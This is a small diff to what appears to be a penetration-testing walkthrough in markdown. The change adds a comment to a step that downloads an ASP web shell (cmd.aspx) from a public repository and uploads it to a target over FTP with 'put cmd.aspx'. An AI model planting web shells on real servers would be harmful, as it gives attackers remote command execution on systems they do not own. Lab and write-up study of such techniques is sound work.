@@ -46,6 +46,7 @@ dir
 Download, and transfer asp webshell using [cmd.aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx).
 
 ```
+# On the target machine with ftp connection:
 put cmd.aspx
 
 dir
